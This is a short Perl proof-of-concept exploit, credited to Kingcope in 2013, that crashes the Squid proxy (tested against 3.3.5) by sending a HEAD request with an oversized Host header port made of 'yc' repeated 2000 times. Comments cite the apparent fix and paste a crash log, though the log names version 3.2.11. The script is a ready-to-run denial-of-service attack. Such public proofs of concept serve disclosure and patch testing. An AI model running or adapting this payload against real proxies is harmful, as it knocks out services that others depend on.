#Squid Crash PoC
#Copyright (C) Kingcope 2013
#tested against squid-3.3.5
#this seems to be the patch for the vulnerability:
#http://www.squid-cache.org/Versions/v3/3.3/squid-3.3.8.patch
#The squid-cache service will respawn, looks like a kind of assert exception:
#2013/07/15 20:48:36 kid1| Closing HTTP port 0.0.0.0:3128
#2013/07/15 20:48:36 kid1| storeDirWriteCleanLogs: Starting...
#2013/07/15 20:48:36 kid1|   Finished.  Wrote 0 entries.
#2013/07/15 20:48:36 kid1|   Took 0.00 seconds (  0.00 entries/sec).
#FATAL: Bungled (null) line 9: snmp_access deny all
#Squid Cache (Version 3.2.11): Terminated abnormally.
#CPU Usage: 0.020 seconds = 0.012 user + 0.008 sys
#Maximum Resident Size: 33312 KB
#Page faults with physical i/o: 0
#Memory usage for squid via mallinfo():
#        total space in arena:    4100 KB
#        Ordinary blocks:         4046 KB      7 blks
#        Small blocks:               0 KB      0 blks
#        Holding blocks:           564 KB      2 blks
#        Free Small blocks:          0 KB
#        Free Ordinary blocks:      53 KB
#        Total in use:            4610 KB 112%
#        Total free:                53 KB 1%
#2013/07/15 20:48:39 kid1| Starting Squid Cache version 3.2.11 for
i686-pc-linux-gnu...
#2013/07/15 20:48:39 kid1| Process ID 2990

use IO::Socket;

my $sock = IO::Socket::INET->new(PeerAddr => '192.168.27.146',
                              PeerPort => '3128',
                              Proto    => 'tcp');
$a = "yc" x 2000;
print $sock "HEAD http://yahoo.com/ HTTP/1.1\r\nHost: yahoo.com:$a\r\n\r\n";
while(<$sock>) {
print;
}
